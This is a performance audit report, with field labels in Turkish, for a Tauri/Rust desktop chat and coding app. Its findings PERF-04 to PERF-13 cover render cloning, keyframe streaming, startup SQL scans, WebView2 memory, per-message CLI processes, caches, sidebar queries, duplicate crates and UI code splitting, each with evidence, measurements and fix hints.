### PERF-04 — Claude Code engine (also Chat on a Claude subscription) deep-clones and re-renders the whole turn every 45 ms on a runtime worker

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/claudecode.rs`, `src-tauri/src/engine.rs`, `src-tauri/src/render.rs`
- Kanıt: claudecode.rs:392-433 (emit) runs on every stream_event (claudecode.rs:1204), throttled to 45 ms. It clones all rows (display_rows, claudecode.rs:359-368), scans every block (running_tools, :370-388), clones the tracker and calls render::assistant_turn over all rows (:416), then clones the live row's content (:428), all inline in the async event loop. The built-in engine already avoids this with a cached prefix (engine.rs:566-628, TurnRenderer/TurnPrefix). Chat on the subscription goes through this same path (claudecode.rs:731-733: `chat = conv.kind != "code"`). Measured with the same steps in a release scratch crate: 0.8-1.3 ms per tick with small tool outputs; with Read-sized results (1,000 lines, about 85 KB, truncated to 40 KB in the view) it is 2.1, 5.3 and 11.6 ms per tick at 10, 40 and 100 tool rounds, which is about 25% of a core at 100 rounds. The built-in engine's existing bench_live_ticks measures 0.34 ms render per tick at 40 rounds. new_row! also calls tree_nodes (claudecode.rs:1014), and run_once calls path_to (:735, :1051) synchronously on the runtime.
- Düzeltme ipucu: Reuse TurnRenderer/render::TurnPrefix for ts.rows: render finished rows once and only the streaming row per tick. Render from references with the live content swapped in, so the rows are not cloned. Keep running_tools incrementally (update it when a tool_use or tool_result row is added). Move path_to/tree_nodes into spawn_blocking.

### PERF-05 — Turn stream sends a full keyframe every second, about 70% of the streamed bytes and several MB/s in long agentic turns

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/turnstream.rs`, `ui/js/turnstream.js`
- Kanıt: turnstream.rs:34 sets `KEYFRAME_EVERY = 1000 ms`. turnstream.rs:98-103 forces a full turn once a second even when nothing was missed. Measured with the existing turnstream::tests::measure (release): at 40 rounds there are 4,125 events, the full turn averages 245 KB (466 KB at the end), the compact stream totals 66.0 MB and the median delta is 1.4 KB. About 186 keyframes x 245 KB is about 46 MB, roughly 70% of the 66 MB. With about 85 KB tool outputs the full turn measured 2.0 MB at 40 rounds and 4.9 MB at 100 rounds (scratch crate). That is 2-5 MB/s of event JSON that the WebView has to parse, only so that a reloaded page can catch up.
- Düzeltme ipucu: Send a keyframe at turn start and on demand. When turnstream.js cannot expand a delta (base mismatch), it calls a small command that sets a resync flag for that conversation in the encoder, and the next event goes out whole. Alternatively, raise KEYFRAME_EVERY to about 10 s as a stopgap. Tauri events inside a live page are not dropped, so the 1-second keyframe only helps after a reload.

### PERF-06 — Every launch runs a full-table JSON scan and UPDATE of messages synchronously in setup(), before the window is shown

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/lib.rs`, `src-tauri/src/db.rs`, `src-tauri/src/claudecode.rs`
- Kanıt: lib.rs:290 calls `db.mark_interrupted()` inside .setup(), on the main thread, before w.show() (lib.rs:317-325; tauri.conf.json sets `visible: false`). db.rs:715-725 runs `UPDATE messages SET meta = json_set(...) WHERE role='assistant' AND json_extract(meta,'$.stop_reason') IS NULL AND ...`, and role and meta have no index. On a synthetic copy of the schema (3,000 conversations, 98,968 messages, 268.5 MB, SQLite 3.50.4) this statement alone takes 139 ms, and it grows linearly with history. In addition, claudecode.rs:1462 sets stop_reason only on the last assistant row of a CLI turn, so the first launch after Claude Code use also rewrites every intermediate CLI assistant row (whole rows, content included).
- Düzeltme ipucu: Add `AND created_at < ?process_start_ms` and run the call on a background thread after the window is shown. Or check only each conversation's current_leaf row (`WHERE id IN (SELECT current_leaf FROM conversations)`). In settle_rows, set stop_reason on every settled CLI row.

### PERF-07 — WebView2 holds about 315 MB working set at idle, and nothing lowers it when the window is hidden to the tray

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/lib.rs`
- Kanıt: Measured on the owner's running release copy (pid 13716, fresh DB, idle): the main process is 74.4 MB WS / 14.4 MB private. Its 6 WebView2 children add 315 MB WS: browser 98.6 / 36.9 MB private, GPU 69.9 / 79.1, renderer 62.9 / 38.0, network 43.5 / 11.9, storage 23.6 / 7.8, crashpad 16.9 / 3.0. The whole tree is 389.6-390.8 MB WS and 191.1-191.5 MB private, using 0 ms of CPU over 10 s. lib.rs:339-341 only calls window.hide() for keep_in_tray. No call to MemoryUsageTargetLevel, TrySuspend or with_webview exists anywhere in src-tauri (searched for all three).
- Düzeltme ipucu: When hiding to the tray or minimizing, use `webview_window.with_webview` to set ICoreWebView2_19 MemoryUsageTargetLevel to LOW, or call ICoreWebView2_3::TrySuspend when no turn is running. Restore it in show_main (lib.rs:63-71).

### PERF-08 — Chat on the Claude subscription starts a new Claude Code CLI process for each message and ends it at the result

- Önem: **medium**, efor: **L**
- Dosyalar: `src-tauri/src/claudecode.rs`
- Kanıt: run_once spawns the CLI per turn (claudecode.rs:769 args, :825 `--resume`, spawn at about :899 with kill_on_drop). At the `result` event it closes stdin (claudecode.rs:1329 `stdin = None`), so the process exits and the next message boots and resumes again. The CLI binary is 362-378 MB (the bundled claude-code exe and ~/.local/bin/claude). The resident CLI processes measured on this machine (Claude Desktop's own sessions, long ones) used 397-454 MB WS and 626-815 MB private each. So during every chat turn the footprint is several times the 390 MB app, and each message pays for process start and session resume. I did not measure per-turn latency (I did not run a real turn). deliver_say! (claudecode.rs:1042-1074) already shows that one CLI process can take several user messages over stream-json.
- Düzeltme ipucu: Keep one CLI process warm per open chat conversation. Do not close stdin at the result; feed the next message the way deliver_say! does, with an idle timeout (for example 5 min) and a limit of one or two warm processes. Kill it when the conversation is switched or deleted.

### PERF-09 — The built-in agent keeps each edited file's original bytes for the app's lifetime with no total cap, and the Changes pane deep-copies all of them on every refresh

- Önem: **low**, efor: **M**
- Dosyalar: `src-tauri/src/codetools.rs`, `src-tauri/src/gitops.rs`, `src-tauri/src/state.rs`
- Kanıt: codetools.rs:35 holds `originals: Arc<Mutex<HashMap<PathBuf, Original>>>`, and :51 keeps up to MAX_ORIGINAL_BYTES = 20 MB per file. remember_original (:66-81) does `std::fs::read` under the lock on every Write/Edit (:1191, :1212, :1240), git repositories included. Sessions live in AppState.code_sessions (state.rs:104-110) and are removed only on reset or delete (commands.rs:435, :726). There is no per-session or total cap. gitops.rs:259 runs `session.originals.lock().clone()` (a full byte copy) on each Changes refresh in non-git folders.
- Düzeltme ipucu: Store originals as Arc<[u8]> so cloning the map is cheap, or spill them to files under data_dir. Add a total byte cap per session. Drop a session's originals when its conversation has been idle or closed.

### PERF-10 — Ctrl+R prompt history repeats a 305 ms full scan on each keystroke, although the SQL does not depend on the query

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/db.rs`, `ui/js/prompt_history.js`, `src-tauri/src/commands.rs`
- Kanıt: db.rs:486-525: the SQL (json_each over every user message, ORDER BY created_at DESC LIMIT 5000) has no query parameter, and the word filter is applied in Rust afterwards. prompt_history.js:52 and :58 call it again after each 120 ms pause in typing. Measured on the synthetic 268.5 MB / 98,968-message DB: 305 ms per call. The same DB gave usage_since 125 ms, conversations_editing 199 ms, imported_keys 130 ms and FTS search 94-119 ms for common prefixes, which are acceptable for on-demand pages.
- Düzeltme ipucu: Fetch the 5,000 rows once when the popup opens (or cache them in Rust keyed by a write counter) and filter in memory on each keystroke.

### PERF-11 — The sidebar re-reads and serializes every conversation after each answer to draw about 30 rows

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/sidebar.js`, `src-tauri/src/commands.rs`, `src-tauri/src/db.rs`
- Kanıt: sidebar.js:185 calls list_conversations with no limit on every refreshSidebarSoon, which fires on generation-state and conversation-updated (main.js:183-185); 14 emit_conv_updated call sites exist in src-tauri. commands.rs:254-277 and db.rs:380-396 run `SELECT *` over all conversations, parse each `options` JSON and build a JSON object per row. renderLists then uses only the starred rows plus RECENT_LIMIT (sidebar.js:221). Measured: 4.0 ms of SQL for 3,000 rows on the synthetic DB, plus serialization and IPC of every row.
- Düzeltme ipucu: Give list_conversations `limit` and `kind` arguments for the sidebar (starred plus the newest RECENT_LIMIT, only the needed columns). Keep the full list for the All chats and Sessions pages.

### PERF-12 — Two HTTP client stacks and two HTML parsers are linked into the binary

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/Cargo.toml`, `Cargo.lock`
- Kanıt: `cargo tree -d` (Windows target): reqwest 0.12.28 comes from clauderust itself and reqwest 0.13.5 from tauri-plugin-updater 2.14.1. html5ever 0.31.0 comes from html2text 0.14.4 and 0.39.0 from dom_query via tauri-utils. base64 0.22 (via reqwest 0.12) and 0.23 (own) are both present too. clauderust.exe is 24.91 MB. For scale, the NSIS installer is 7.75 MB and the MSI 10.41 MB, while Claude Desktop's install is 760.2 MB, so this is polish.
- Düzeltme ipucu: Move the app to reqwest 0.13 (shared with the updater) and to an html2text version on html5ever 0.39 if one exists. Then re-check with `cargo tree -d` and compare the binary size.

### PERF-13 — No code splitting in the UI: 51 of 53 modules (530 KB) load and run at startup

- Önem: **low**, efor: **M**
- Dosyalar: `ui/js/main.js`, `ui/js/settings.js`, `ui/js/importer.js`, `ui/js/onboarding.js`, `ui/js/routines.js`, `ui/js/panes`
- Kanıt: A static-import closure walk from ui/js/main.js reaches 51 modules, 530,549 bytes of the 535,321 bytes of JS. Only prompt_history.js and quick.js are outside it. main.js:2-43 imports every pane (changes, review, commit, plan, terminal, tasks, preview, map, history, files), settings.js (35 KB), importer.js, routines.js and onboarding.js eagerly. The later `import()` calls (chat.js:646/648, search.js:150-152, and others) target modules that are already statically imported, so they do not split anything. katex and xterm are loaded lazily (parts.js:10-22, panes/terminal.js:21).
- Düzeltme ipucu: Turn the imports of settings, importer, onboarding, routines and the Code-only panes into `import()` on first use (workspace.show, openSettings, the onboarding path), so Chat startup parses only chat, composer, sidebar and their helpers.
